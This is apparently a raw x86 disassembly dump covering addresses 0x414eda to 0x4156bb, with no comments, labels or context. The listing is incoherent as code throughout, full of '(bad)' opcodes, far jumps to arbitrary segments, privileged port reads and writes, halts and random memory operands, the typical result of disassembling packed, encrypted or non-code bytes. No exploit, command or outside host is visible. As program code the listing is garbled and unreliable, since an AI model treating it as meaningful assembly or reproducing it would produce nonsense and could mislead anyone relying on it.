  414eda:	aaa    
  414edb:	jle    0x414e70
  414edd:	or     al,0xe
  414edf:	out    dx,al
  414ee0:	jbe    0x414eae
  414ee2:	pop    esp
  414ee3:	loope  0x414e97
  414ee5:	mov    eax,ds:0xef676125
  414eea:	sahf   
  414eeb:	or     BYTE PTR [ebx+0x6b5cd859],bh
  414ef1:	push   edi
  414ef2:	out    dx,eax
  414ef3:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  414ef5:	in     eax,dx
  414ef6:	aaa    
  414ef7:	sbb    edi,esp
  414ef9:	fsubrp st(1),st
  414efb:	jmp    0x5ecb:0x4de1f512
  414f02:	xor    edx,DWORD PTR [eax]
  414f04:	and    DWORD PTR [edi+0x46],0xffffffca
  414f08:	xor    al,0x7c
  414f0a:	aad    0x97
  414f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f0d:	shl    DWORD PTR fs:[edx+0x165b5df7],1
  414f14:	jmp    0x59b7ce66
  414f19:	in     al,dx
  414f1a:	or     ebp,DWORD PTR [edi-0x760bfbcc]
  414f20:	dec    esi
  414f21:	jnp    0x414f11
  414f23:	fmul   DWORD PTR [edx]
  414f25:	pushf  
  414f26:	adc    esp,DWORD PTR [ebp+0xe]
  414f29:	sbb    DWORD PTR [eax-0x39e32692],0xf6c85ef8
  414f33:	in     al,dx
  414f34:	sub    eax,0x83b96da7
  414f39:	mov    bl,0xa4
  414f3b:	mov    esi,0x348ee1ba
  414f40:	sbb    esp,edi
  414f42:	pushf  
  414f43:	sbb    al,BYTE PTR [ebx]
  414f45:	shl    BYTE PTR [ebp+0x1f947295],cl
  414f4b:	push   0x523a3ce7
  414f50:	aas    
  414f51:	and    DWORD PTR [esi+0x22],ebp
  414f54:	or     DWORD PTR [edi],ebx
  414f56:	loopne 0x414f50
  414f58:	icebp  
  414f59:	dec    esi
  414f5a:	jmp    DWORD PTR [edi+ebp*4+0x48]
  414f5e:	mov    esp,0x2ff40709
  414f63:	inc    esp
  414f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f65:	push   eax
  414f66:	pop    esi
  414f67:	int3   
  414f68:	inc    ebx
  414f69:	adc    eax,DWORD PTR [esi+0x30e603fe]
  414f6f:	mov    bl,0x70
  414f71:	bound  edi,QWORD PTR ds:0xc75657a2
  414f77:	ins    BYTE PTR es:[edi],dx
  414f78:	jno    0x414f75
  414f7a:	push   ecx
  414f7b:	leave  
  414f7c:	mov    gs,WORD PTR [edx+ebx*4-0x1a18fd8a]
  414f83:	popf   
  414f84:	sbb    BYTE PTR [ebx],bh
  414f86:	add    bl,BYTE PTR [eax]
  414f88:	mov    al,0xab
  414f8a:	xlat   BYTE PTR ds:[ebx]
  414f8b:	bound  ecx,QWORD PTR [ebp*1+0x38be3908]
  414f92:	in     eax,0x53
  414f94:	js     0x414f95
  414f96:	sub    eax,0xbcfb1a60
  414f9b:	hlt    
  414f9c:	stc    
  414f9d:	cdq    
  414f9e:	sub    DWORD PTR [ecx+0x1e019b60],esi
  414fa4:	inc    ebx
  414fa5:	push   ebp
  414fa6:	test   DWORD PTR ss:[edi-0xd],0x3e54964
  414fae:	(bad)  
  414faf:	jp     0x414f5a
  414fb1:	iret   
  414fb2:	cld    
  414fb3:	jae    0x414fcf
  414fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fb6:	jnp    0x414f8a
  414fb8:	stc    
  414fb9:	es mov ah,0xfd
  414fbc:	push   0xecbcadfe
  414fc1:	cmp    DWORD PTR [edx+0x54],edx
  414fc4:	arpl   WORD PTR [ebx-0x7f4f6d1e],ax
  414fca:	ins    DWORD PTR es:[edi],dx
  414fcb:	mov    edi,0x25e90e70
  414fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fd1:	dec    ecx
  414fd2:	popf   
  414fd3:	ds xchg ebp,eax
  414fd5:	mov    eax,ds:0x6b814069
  414fda:	mov    DWORD PTR [ebx],esi
  414fdc:	mov    BYTE PTR [edx+0x7198187b],al
  414fe2:	mov    edi,0x6e23d184
  414fe7:	cld    
  414fe8:	push   esp
  414fe9:	call   edx
  414feb:	test   DWORD PTR [edi+0x744652a4],eax
  414ff1:	mov    ch,0x28
  414ff3:	jbe    0x415029
  414ff5:	pop    edi
  414ff6:	sbb    DWORD PTR [edi],eax
  414ff8:	ret    
  414ff9:	pop    edi
  414ffa:	dec    ecx
  414ffb:	out    dx,al
  414ffc:	out    dx,al
  414ffd:	inc    ecx
  414ffe:	jno    0x415006
  415000:	and    eax,0x1962eab1
  415005:	jne    0x414f94
  415007:	ret    
  415008:	lods   eax,DWORD PTR ds:[esi]
  415009:	pop    edi
  41500a:	or     BYTE PTR [eax],0xfc
  41500d:	dec    esi
  41500e:	ret    
  41500f:	arpl   WORD PTR [ecx],dx
  415011:	ins    BYTE PTR es:[edi],dx
  415012:	add    al,0x15
  415014:	mov    WORD PTR [eax-0x7e7982ca],ds
  41501a:	aad    0xb4
  41501c:	fs jo  0x414fa4
  41501f:	sbb    al,0x77
  415021:	das    
  415022:	lds    eax,FWORD PTR [edi+0x4a]
  415025:	cld    
  415026:	adc    DWORD PTR [esi-0x64f7d9a1],edx
  41502c:	jnp    0x415064
  41502e:	ins    BYTE PTR es:[edi],dx
  41502f:	stc    
  415030:	push   esp
  415031:	xchg   esp,eax
  415032:	bound  edi,QWORD PTR [edx-0x54]
  415035:	jmp    0x414fe7
  415037:	mov    ecx,0x1a68e69b
  41503c:	jnp    0x415046
  41503e:	repz dec esi
  415040:	mov    al,0x25
  415042:	push   0x202778b
  415047:	into   
  415048:	loop   0x41507e
  41504a:	xor    bh,BYTE PTR [esp+esi*4+0x6306c0f2]
  415051:	xchg   esp,eax
  415052:	jno    0x41509f
  415054:	daa    
  415055:	retf   
  415056:	(bad)  
  415058:	xchg   BYTE PTR [edx-0x458d89e1],dl
  41505e:	stc    
  41505f:	sub    DWORD PTR [ecx],eax
  415061:	inc    eax
  415062:	mov    esi,0x723c241
  415067:	call   0xa28c:0x73562806
  41506e:	xor    eax,0x1d8d90ba
  415073:	(bad)
  415076:	fs mov dl,0x36
  415079:	hlt    
  41507a:	dec    ebp
  41507b:	pop    eax
  41507c:	jae    0x415073
  41507e:	outs   dx,BYTE PTR ds:[esi]
  41507f:	retf   
  415080:	push   esi
  415081:	test   DWORD PTR [eax],edi
  415083:	adc    DWORD PTR [esi+0x2bc14ef6],0xba2687bd
  41508d:	ror    BYTE PTR [edi+0x57065173],0xf7
  415094:	pop    ebx
  415095:	rcl    BYTE PTR [ecx+ebp*1+0x29e736d0],cl
  41509c:	push   edx
  41509d:	push   ecx
  41509e:	pop    ss
  41509f:	mov    ebx,0x1587eee1
  4150a4:	add    esi,DWORD PTR [ecx-0x4a83ae23]
  4150aa:	push   ss
  4150ab:	cmp    DWORD PTR [ecx+0x77],esi
  4150ae:	xchg   ebx,eax
  4150af:	mov    bl,BYTE PTR [ecx-0x43]
  4150b2:	inc    ecx
  4150b3:	mov    eax,ds:0xf18692a
  4150b8:	jmp    0xfe7:0x57c5705c
  4150bf:	inc    ecx
  4150c0:	fs pop es
  4150c2:	mov    dl,0x34
  4150c4:	mov    edx,0x15db697
  4150c9:	push   cs
  4150ca:	cmp    DWORD PTR ds:0xcb5d6ec8,ebx
  4150d0:	jge    0x4150b6
  4150d2:	and    BYTE PTR [edx],cl
  4150d4:	stos   DWORD PTR es:[edi],eax
  4150d5:	push   esp
  4150d6:	(bad)  
  4150d7:	test   al,0xba
  4150d9:	mov    ah,0xea
  4150db:	jae    0x4150b0
  4150dd:	mov    ?,WORD PTR cs:[eax]
  4150e0:	popa   
  4150e1:	push   ds
  4150e2:	fwait
  4150e3:	push   cs
  4150e4:	leave  
  4150e5:	mov    bh,0x92
  4150e7:	das    
  4150e8:	sub    al,0x76
  4150ea:	imul   edi,ebx,0x33
  4150ed:	daa    
  4150ee:	adc    ch,BYTE PTR [ebx+0x9]
  4150f1:	cmp    eax,0x69fcb730
  4150f6:	retf   0x8226
  4150f9:	cdq    
  4150fa:	mov    dl,0x99
  4150fc:	pop    esi
  4150fd:	mov    cs,edx
  4150ff:	push   ebx
  415100:	pop    ebx
  415101:	and    eax,0x6627d95c
  415106:	jnp    0x415093
  415108:	and    eax,0x5af7b2f5
  41510d:	cmp    cl,BYTE PTR [edx]
  41510f:	add    ebx,DWORD PTR [edx]
  415111:	lahf   
  415112:	adc    al,0x54
  415114:	ins    BYTE PTR es:[edi],dx
  415115:	add    DWORD PTR [ebx-0x3daf51e5],eax
  41511b:	nop
  41511c:	pop    ecx
  41511d:	push   ebp
  41511e:	jmp    0xcea66d39
  415123:	enter  0x73d0,0xe8
  415127:	in     eax,dx
  415128:	lahf   
  415129:	mov    fs,WORD PTR [ebp+0x40a7ace1]
  41512f:	stos   DWORD PTR es:[edi],eax
  415130:	(bad)  
  415131:	pop    ds
  415132:	imul   ecx,ecx,0x1a
  415135:	test   eax,0xbfd520b4
  41513a:	mov    ebp,0x9fea40a0
  41513f:	nop
  415140:	jb     0x4150c3
  415142:	and    al,0x1f
  415144:	repz fsubr QWORD PTR ds:0xf98a6a11
  41514b:	fild   QWORD PTR [ecx-0x104cb238]
  415151:	cmp    DWORD PTR [ecx+0x41],ecx
  415154:	lahf   
  415155:	(bad)  
  415156:	retf   0xad00
  415159:	inc    esp
  41515a:	das    
  41515b:	xchg   edi,eax
  41515c:	and    ebp,edx
  41515e:	lock leave 
  415160:	cmp    eax,0x7f94cd0a
  415165:	iret   
  415166:	mov    edi,0x873a9742
  41516b:	sti    
  41516c:	sar    DWORD PTR [edx+0x26],0x98
  415170:	sbb    BYTE PTR [eax],dl
  415172:	mov    bl,0x61
  415174:	sbb    al,0x23
  415176:	pushf  
  415177:	call   0x96ea:0x7e1ec297
  41517e:	and    ebp,eax
  415180:	ret    0x238f
  415183:	fs push es
  415185:	push   0x70
  415187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415188:	jmp    ebp
  41518a:	pop    ss
  41518b:	dec    edx
  41518c:	pop    ecx
  41518d:	adc    DWORD PTR [esi],esi
  41518f:	jnp    0x415124
  415191:	cmp    al,0x72
  415193:	shl    BYTE PTR [eax],cl
  415195:	scas   eax,DWORD PTR es:[edi]
  415196:	les    edi,FWORD PTR [edx+0x4b3a3f2f]
  41519c:	out    dx,eax
  41519d:	or     dh,BYTE PTR [edi-0x4a]
  4151a0:	xor    eax,0x776638cf
  4151a5:	adc    al,dh
  4151a7:	fild   QWORD PTR ds:0xbd102e56
  4151ad:	inc    edi
  4151ae:	fwait
  4151af:	gs xchg bl,al
  4151b2:	sbb    ebx,edi
  4151b4:	adc    eax,0x1b2702c1
  4151b9:	push   es
  4151ba:	pop    esp
  4151bb:	cmp    bh,BYTE PTR [eiz*2+0x63b60c5]
  4151c2:	mov    WORD PTR [ebx],fs
  4151c4:	mov    al,ds:0xa363fce1
  4151c9:	lock or al,0xe3
  4151cc:	hlt    
  4151cd:	sbb    DWORD PTR [ecx+0x14f80910],eax
  4151d3:	add    ebp,edi
  4151d5:	rcr    ebp,cl
  4151d7:	bnd jge 0x4151b2
  4151da:	enter  0x82c3,0x10
  4151de:	cwde   
  4151df:	xor    bp,cx
  4151e2:	mov    al,ds:0x741f3e5e
  4151e7:	or     BYTE PTR [edx+0x3061b1ba],bh
  4151ed:	pop    ebx
  4151ee:	call   0x291e:0x5bad
  4151f4:	shl    DWORD PTR [ebx],0xe2
  4151f7:	fisubr WORD PTR [edi-0x61]
  4151fa:	imul   DWORD PTR [ecx]
  4151fc:	outs   dx,BYTE PTR fs:[esi]
  4151fe:	mov    esp,0xad927d08
  415203:	xchg   esi,eax
  415204:	inc    esi
  415205:	iret   
  415206:	xchg   DWORD PTR [ebx+0x75e68676],ebp
  41520c:	cld    
  41520d:	dec    ecx
  41520e:	push   ds
  41520f:	or     dh,BYTE PTR [esi+0x2]
  415212:	cmp    al,BYTE PTR [ebp-0x4ded68e]
  415218:	pop    ss
  415219:	ins    BYTE PTR es:[edi],dx
  41521a:	fidivr DWORD PTR [esi-0x5a]
  41521d:	leave  
  41521e:	adc    dh,bl
  415220:	mov    fs,ecx
  415222:	(bad)  
  415224:	outs   dx,DWORD PTR ds:[esi]
  415225:	jmp    0xb43e5da0
  41522a:	sub    esp,esi
  41522c:	or     edi,DWORD PTR [esi-0x256e131e]
  415232:	add    ch,BYTE PTR [ebx]
  415234:	ffreep st(0)
  415236:	std    
  415237:	or     esi,DWORD PTR [esi+0x53]
  41523a:	xchg   ebp,eax
  41523b:	addr16 loope 0x41529a
  41523e:	push   edi
  41523f:	jae    0x41529c
  415241:	jbe    0x415280
  415243:	cmc    
  415244:	cmp    dl,ch
  415246:	cmp    esi,DWORD PTR [eax-0x63]
  415249:	fwait
  41524a:	pushf  
  41524b:	and    edi,DWORD PTR [eax+0x4f]
  41524e:	or     esi,DWORD PTR [eax]
  415250:	rol    DWORD PTR [edx+0x8],cl
  415253:	pop    ss
  415254:	inc    eax
  415255:	cmp    eax,0x5103693e
  41525a:	and    BYTE PTR [ecx],dl
  41525c:	inc    edi
  41525d:	jmp    0xc0eadca3
  415262:	scas   eax,DWORD PTR es:[edi]
  415263:	fsub   QWORD PTR [ecx+esi*4]
  415266:	pusha  
  415267:	push   eax
  415268:	int    0x3e
  41526a:	xchg   DWORD PTR ds:0xd0b36aac,edx
  415270:	mov    edx,0xce4665a0
  415275:	popa   
  415276:	adc    DWORD PTR [ecx+0x6f],esi
  415279:	out    dx,al
  41527a:	pushf  
  41527b:	rcr    DWORD PTR [edi+edi*8-0x16874b49],cl
  415282:	aas    
  415283:	mov    ds:0x6d29639b,eax
  415288:	es pushf 
  41528a:	or     dh,BYTE PTR [ecx+0x4e]
  41528d:	ret    0xe980
  415290:	jo     0x41526c
  415292:	(bad)  
  415294:	in     al,0x6
  415296:	push   cs
  415297:	or     dh,BYTE PTR [ecx+edx*2-0x3f5848eb]
  41529e:	fmul   QWORD PTR [esi+0x66]
  4152a1:	enter  0xf872,0xbf
  4152a5:	mov    edx,0xb586e5e5
  4152aa:	imul   esp,DWORD PTR [edi],0xffffffde
  4152ad:	shl    BYTE PTR [eax+0x18],0x37
  4152b1:	out    dx,eax
  4152b2:	sub    eax,ebx
  4152b4:	lock rol BYTE PTR [ebx+edi*4],cl
  4152b8:	mov    al,0xb5
  4152ba:	scas   eax,DWORD PTR es:[edi]
  4152bb:	ror    DWORD PTR [ebx],cl
  4152bd:	mov    eax,0xfb069bba
  4152c2:	pop    ebp
  4152c3:	pusha  
  4152c4:	xlat   BYTE PTR ds:[ebx]
  4152c5:	pushf  
  4152c6:	cmp    BYTE PTR [eax],dh
  4152c8:	push   ecx
  4152c9:	pop    ds
  4152ca:	ret    0x7ab3
  4152cd:	push   ebp
  4152ce:	clc    
  4152cf:	dec    ebx
  4152d0:	sbb    eax,0xa78d05d5
  4152d5:	mov    ds:0x6ca8b507,al
  4152da:	jnp    0x4152f6
  4152dc:	cmp    ecx,DWORD PTR [ecx-0x50969fc]
  4152e2:	xor    eax,DWORD PTR [ebx-0x3ef915d2]
  4152e8:	xchg   esi,eax
  4152e9:	aas    
  4152ea:	mov    DWORD PTR [eax],ebp
  4152ec:	aas    
  4152ed:	es adc bl,dl
  4152f0:	repz and edx,DWORD PTR [edx]
  4152f3:	sar    BYTE PTR [ebp-0x3b],1
  4152f6:	mov    ebx,0xaae9ef26
  4152fb:	jae    0x415328
  4152fd:	xchg   edi,eax
  4152fe:	mov    ebx,0x7ef1c9b5
  415303:	lods   al,BYTE PTR ds:[esi]
  415304:	and    eax,0x7d318b1c
  415309:	scas   al,BYTE PTR es:[edi]
  41530a:	sub    BYTE PTR [ebp+0x78202bbf],ah
  415310:	push   eax
  415311:	mov    ch,0x23
  415313:	mov    ebx,0x9135ce4f
  415318:	add    edi,DWORD PTR [ecx]
  41531a:	xchg   esp,eax
  41531b:	out    dx,eax
  41531c:	jne    0x4152cb
  41531e:	sub    DWORD PTR [edx],ebx
  415320:	fsubr  DWORD PTR [ecx-0x69]
  415323:	pushf  
  415324:	xor    DWORD PTR [edx-0x8d1a588],0xa2fefe8b
  41532e:	mov    ebp,0x1529a5a9
  415333:	or     DWORD PTR [ecx],esi
  415335:	pushf  
  415336:	inc    DWORD PTR [ebx]
  415338:	in     al,dx
  415339:	dec    DWORD PTR [eax+eiz*8]
  41533c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41533d:	push   cs
  41533e:	mov    al,ds:0x648d61b8
  415343:	xchg   ebx,eax
  415344:	mov    eax,ss
  415346:	xchg   esp,eax
  415347:	or     eax,DWORD PTR [ebx+0x48]
  41534a:	call   0xe5f3:0x4a580c71
  415351:	enter  0xfd09,0x71
  415355:	js     0x415350
  415357:	ja     0x415343
  415359:	jmp    0x41538d
  41535b:	cli    
  41535c:	sub    eax,0xf51c4453
  415361:	sub    cl,ah
  415363:	(bad)  
  415364:	fsubr  st,st(5)
  415366:	rol    BYTE PTR [edx-0x732dc3bc],0x2c
  41536d:	mov    ebx,DWORD PTR [esi-0x7a77477b]
  415373:	and    DWORD PTR [ebx],ebx
  415375:	jb     0x415300
  415377:	neg    DWORD PTR [edi]
  415379:	xor    DWORD PTR [edi],ebp
  41537b:	jne    0x41531b
  41537d:	ret    
  41537e:	mov    BYTE PTR [edi-0xb892bbd],dh
  415384:	sub    DWORD PTR [edx+0x74c28a08],eax
  41538a:	xlat   BYTE PTR ds:[ebx]
  41538b:	dec    edx
  41538c:	retf   
  41538d:	xor    al,0xed
  41538f:	cdq    
  415390:	or     DWORD PTR [ebp+0x5],ebp
  415393:	test   eax,0xd6987b30
  415398:	or     al,0xea
  41539a:	cli    
  41539b:	pop    ebp
  41539c:	hlt    
  41539d:	adc    ecx,DWORD PTR [esp+eax*8]
  4153a0:	lahf   
  4153a1:	scas   al,BYTE PTR es:[edi]
  4153a2:	inc    edx
  4153a3:	cli    
  4153a4:	icebp  
  4153a5:	jl     0x4153a0
  4153a7:	xchg   ebx,eax
  4153a8:	inc    esp
  4153a9:	and    BYTE PTR [edx-0x80],cl
  4153ac:	push   ecx
  4153ad:	push   0x2170638d
  4153b2:	and    al,0x6c
  4153b4:	pop    di
  4153b6:	mov    ch,0x81
  4153b8:	sti    
  4153b9:	mul    BYTE PTR [edi]
  4153bb:	in     eax,0xe9
  4153bd:	out    dx,eax
  4153be:	aad    0x5
  4153c0:	repnz adc esp,DWORD PTR [ebx-0x34ab31d4]
  4153c7:	sar    DWORD PTR [ebx+0x5],0xf1
  4153cb:	cmp    eax,DWORD PTR [edi+0xc]
  4153ce:	jbe    0x41538f
  4153d0:	lea    esp,[edi+esi*1-0x5f]
  4153d4:	jmp    0xfe05:0xd08b380f
  4153db:	test   BYTE PTR [eax],bl
  4153dd:	jmp    0xc03e9c0e
  4153e2:	jno    0x415422
  4153e4:	cmp    ch,ch
  4153e6:	stos   BYTE PTR es:[edi],al
  4153e7:	or     al,0xc8
  4153e9:	cmp    dl,BYTE PTR [ecx]
  4153eb:	sbb    eax,0x957d1dbd
  4153f0:	push   ebx
  4153f1:	hlt    
  4153f2:	cwde   
  4153f3:	mov    ebp,0x5036efaa
  4153f8:	adc    eax,0x2b712b67
  4153fd:	ds sbb al,0xa4
  415400:	mov    bh,0x50
  415402:	stc    
  415403:	outs   dx,BYTE PTR ds:[esi]
  415404:	shl    BYTE PTR ds:0x505798c4,0x10
  41540b:	imul   edi,DWORD PTR [edx-0x12d55cd9],0x67
  415412:	pop    esi
  415413:	enter  0x8940,0xd4
  415417:	inc    ebx
  415418:	mov    esi,0xdea00fa4
  41541d:	xchg   BYTE PTR [ecx+0x4e],dl
  415420:	and    bh,BYTE PTR [ecx+edx*1]
  415423:	xor    DWORD PTR [edi-0xe453a75],0xffffff84
  41542a:	je     0x41547c
  41542c:	dec    edx
  41542d:	aas    
  41542e:	xor    al,0x32
  415430:	aam    0x6b
  415432:	adc    al,0x22
  415434:	mov    ds,WORD PTR [edx]
  415436:	stos   DWORD PTR es:[edi],eax
  415437:	jmp    DWORD PTR [esi+0x42d4965d]
  41543d:	cdq    
  41543e:	cmp    BYTE PTR [edx],0xd4
  415441:	jns    0x4153d4
  415443:	imul   esp,DWORD PTR [edx+0x161e4e8],0x7c3a83e9
  41544d:	mov    ch,0xbd
  41544f:	mov    BYTE PTR [edx],dl
  415451:	retf   
  415452:	pop    edx
  415453:	(bad)  
  415455:	mov    esp,0xc12b3657
  41545a:	cmp    esi,DWORD PTR ds:0xe5e4050d
  415460:	neg    ecx
  415462:	sbb    al,0xd3
  415464:	jmp    0x8621fa53
  415469:	cli    
  41546a:	ins    BYTE PTR es:[edi],dx
  41546b:	sbb    eax,0x3a80ffb0
  415470:	fcom   QWORD PTR ds:0x257683ce
  415476:	xchg   BYTE PTR [ecx-0x3],bh
  415479:	and    ch,BYTE PTR [ecx]
  41547b:	les    ecx,FWORD PTR [ebx+0x1ac85285]
  415481:	xchg   ecx,eax
  415482:	or     edx,DWORD PTR [ecx+edx*1-0x71235d7b]
  415489:	dec    edi
  41548a:	test   al,0x3b
  41548c:	outs   dx,DWORD PTR ds:[esi]
  41548d:	stc    
  41548e:	mov    eax,ds:0x29ea5eb7
  415493:	mov    cl,0x28
  415495:	cwde   
  415496:	in     al,dx
  415497:	xchg   esi,edx
  415499:	stc    
  41549a:	pusha  
  41549b:	bound  ebx,QWORD PTR [edx+0x72]
  41549e:	xchg   ebx,eax
  41549f:	in     eax,dx
  4154a0:	mov    ebx,0x7e7db484
  4154a5:	push   edi
  4154a6:	mov    ebp,0x566bff39
  4154ab:	xor    al,0x5f
  4154ad:	dec    ebx
  4154ae:	mov    ds:0x6e608c54,al
  4154b3:	out    dx,eax
  4154b4:	mov    dl,0x7
  4154b6:	push   ecx
  4154b7:	retf   0x7d77
  4154ba:	mov    edi,0x2aeacc99
  4154bf:	aad    0x4d
  4154c1:	or     dh,ch
  4154c3:	das    
  4154c4:	sub    dh,al
  4154c6:	les    ecx,FWORD PTR [esi-0x12]
  4154c9:	dec    ebx
  4154ca:	cwde   
  4154cb:	adc    al,0x99
  4154cd:	adc    bl,al
  4154cf:	cwde   
  4154d0:	vandps xmm3,xmm7,XMMWORD PTR [eax+ebp*4]
  4154d5:	fcomp  QWORD PTR [esi+0x2]
  4154d8:	or     ecx,esp
  4154da:	test   BYTE PTR [edi+ebx*8],ch
  4154dd:	les    edi,FWORD PTR [esi+0x6d84f66]
  4154e3:	sub    ebx,DWORD PTR [eax+0x23]
  4154e6:	adc    DWORD PTR [ecx+0xf],ecx
  4154e9:	mov    bl,0x3d
  4154eb:	xor    DWORD PTR [ebp-0x63],esi
  4154ee:	push   ebx
  4154ef:	jo     0x415485
  4154f1:	dec    esp
  4154f2:	and    esp,0x18
  4154f5:	xor    al,0x73
  4154f7:	and    al,0x13
  4154f9:	rcl    edi,1
  4154fb:	or     al,0xa7
  4154fd:	or     BYTE PTR [eax+0x3561ea9c],bh
  415503:	shl    BYTE PTR [edi],0x86
  415506:	push   esi
  415507:	push   es
  415508:	xor    ebp,DWORD PTR [esp+edx*2-0x60]
  41550c:	inc    edx
  41550d:	mov    DWORD PTR [ecx-0x5978091e],ebx
  415513:	mov    bh,0xa9
  415515:	push   ebx
  415516:	mov    esp,0x49f94c39
  41551b:	or     BYTE PTR [ebp+0x2df673f8],0xb3
  415522:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  415524:	or     al,0x3a
  415526:	xchg   BYTE PTR [ebp-0xbb672f3],dh
  41552c:	fist   WORD PTR [esi+0x28f7b35e]
  415532:	test   al,0x8b
  415534:	pop    ecx
  415535:	sbb    dh,BYTE PTR cs:[edi-0x6e]
  415539:	xchg   ecx,eax
  41553a:	mov    ebx,0x72e90bd7
  41553f:	xlat   BYTE PTR ds:[ebx]
  415540:	cmp    eax,0x772750b4
  415545:	call   ebp
  415547:	mov    bl,0x73
  415549:	pop    ecx
  41554a:	add    DWORD PTR [edi],edi
  41554c:	leave  
  41554d:	fnsave [eax+0x40]
  415550:	and    al,0x62
  415552:	mov    dl,0x93
  415554:	ins    DWORD PTR es:[edi],dx
  415555:	cld    
  415556:	mov    ecx,0x457b5017
  41555b:	mov    edx,esi
  41555d:	ins    BYTE PTR es:[edi],dx
  41555e:	aam    0x76
  415560:	push   ebp
  415561:	xor    esp,edi
  415563:	add    BYTE PTR [edi-0x19],cl
  415566:	lds    ecx,FWORD PTR [eax-0x23e7b853]
  41556c:	jecxz  0x415581
  41556e:	dec    edx
  41556f:	push   eax
  415570:	imul   ebp,DWORD PTR [ebx+0x3d],0xd0bacf80
  415577:	xor    DWORD PTR [ebp-0x7d3cba05],esp
  41557d:	(bad)  
  41557e:	outs   dx,DWORD PTR ds:[esi]
  41557f:	repz sbb al,BYTE PTR [esi+0x20]
  415583:	sbb    BYTE PTR [edi],0x7e
  415586:	cmp    DWORD PTR [edx],edx
  415588:	mov    al,ds:0xbcbd11b
  41558d:	or     DWORD PTR [edi],esp
  41558f:	sub    DWORD PTR [esi+0x13],0xcf37741c
  415596:	jbe    0x41557a
  415598:	sbb    bl,bh
  41559a:	xchg   edx,eax
  41559b:	test   ah,bl
  41559d:	inc    esp
  41559e:	mov    ds:0xb2081efc,al
  4155a3:	mov    ecx,edx
  4155a5:	test   DWORD PTR [esi-0x4a],edi
  4155a8:	mov    dh,0xa3
  4155aa:	loope  0x415608
  4155ac:	rep ins BYTE PTR es:[edi],dx
  4155ae:	and    edi,DWORD PTR [ebx-0x2701b7d8]
  4155b4:	loop   0x41557a
  4155b6:	ret    
  4155b7:	fsubr  QWORD PTR [edi]
  4155b9:	push   ds
  4155ba:	popa   
  4155bb:	cmp    eax,0x3e2ebba9
  4155c0:	adc    DWORD PTR [edx],esi
  4155c2:	jp     0x41561b
  4155c4:	cmp    al,0xe3
  4155c6:	icebp  
  4155c7:	add    DWORD PTR [ebp+0x7b],eax
  4155ca:	(bad)  [edx]
  4155cc:	ret    0x7cac
  4155cf:	loop   0x41557a
  4155d1:	inc    edi
  4155d2:	popa   
  4155d3:	xchg   esi,eax
  4155d4:	jnp    0x4155b8
  4155d6:	daa    
  4155d7:	test   BYTE PTR [edx-0x5e],0x38
  4155db:	push   ebp
  4155dc:	dec    ebx
  4155dd:	sbb    eax,0xc5ff3606
  4155e2:	inc    ecx
  4155e3:	scas   eax,DWORD PTR es:[edi]
  4155e4:	sbb    bh,dl
  4155e6:	cmp    al,0x6d
  4155e8:	mov    ah,BYTE PTR [edx+ebp*8]
  4155eb:	(bad)
  4155ee:	dec    esp
  4155ef:	dec    ebp
  4155f0:	icebp  
  4155f1:	mov    ebx,0x297a91f4
  4155f6:	repz and al,0x58
  4155f9:	stc    
  4155fa:	arpl   bp,dx
  4155fc:	cld    
  4155fd:	pop    ds
  4155fe:	fwait
  4155ff:	sbb    cl,bl
  415601:	sub    al,0xa1
  415603:	out    dx,eax
  415604:	jnp    0x41563d
  415606:	sbb    BYTE PTR [edx],0xeb
  415609:	sub    DWORD PTR [edx+0x253eec2f],edi
  41560f:	jl     0x415641
  415611:	aaa    
  415612:	and    BYTE PTR [edx+eax*4+0x1250f758],bh
  415619:	sub    ebx,DWORD PTR [ecx+edi*4-0xf]
  41561d:	cli    
  41561e:	jbe    0x415677
  415620:	out    dx,al
  415621:	mov    ss,ebx
  415623:	inc    ebx
  415624:	lods   eax,DWORD PTR ds:[esi]
  415625:	ret    0x5f1d
  415628:	fiadd  DWORD PTR [esi-0x30b5cb30]
  41562e:	inc    eax
  41562f:	inc    ecx
  415630:	lea    esi,[ebp+esi*4-0x5b62752f]
  415637:	out    dx,eax
  415638:	pop    eax
  415639:	ja     0x415694
  41563b:	jbe    0x415629
  41563d:	(bad)
  415640:	pop    ss
  415641:	int3   
  415642:	lock pusha 
  415644:	stos   BYTE PTR es:[edi],al
  415645:	bound  edi,QWORD PTR [edx]
  415647:	iret   
  415648:	mov    WORD PTR [ebx-0x1c7f2dd7],ss
  41564e:	pushf  
  41564f:	outs   dx,DWORD PTR ds:[esi]
  415650:	ins    BYTE PTR es:[edi],dx
  415651:	mov    dh,0xf3
  415653:	jmp    0x17af2280
  415658:	imul   ecx,DWORD PTR [ebx+0x58],0x5e
  41565c:	mov    dl,0x17
  41565e:	sbb    al,0x18
  415660:	(bad)
  415663:	arpl   sp,dx
  415665:	xchg   edx,eax
  415666:	sub    ebx,DWORD PTR [ecx]
  415668:	scas   al,BYTE PTR es:[edi]
  415669:	bswap  ecx
  41566b:	lds    eax,FWORD PTR [esi+0x2]
  41566e:	test   DWORD PTR [edx+edi*1],ebp
  415671:	(bad)  
  415673:	sahf   
  415674:	fcom   DWORD PTR ds:0x85f1f251
  41567a:	ja     0x41564e
  41567c:	inc    esi
  41567d:	and    bl,BYTE PTR [esi+0x7b53d2ac]
  415683:	mov    bl,0x16
  415685:	adc    BYTE PTR [ebp-0xe8a1065],dh
  41568b:	scas   al,BYTE PTR es:[edi]
  41568c:	gs or  eax,0xea79db65
  415692:	test   DWORD PTR [edx-0x1d],ebp
  415695:	pop    ds
  415696:	xor    dh,cl
  415698:	ins    DWORD PTR es:[edi],dx
  415699:	jmp    0xf7001979
  41569e:	cwde   
  41569f:	push   es
  4156a0:	push   ds
  4156a1:	shl    eax,0x29
  4156a4:	dec    ecx
  4156a5:	jno    0x41565b
  4156a7:	sub    BYTE PTR [ebp-0x63a82cd4],dh
  4156ad:	push   eax
  4156ae:	shr    bh,1
  4156b0:	fmul   QWORD PTR [ecx+edi*4]
  4156b3:	sub    al,0xd1
  4156b5:	outs   dx,DWORD PTR ds:[esi]
  4156b6:	mov    esp,0x755b2540
  4156bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
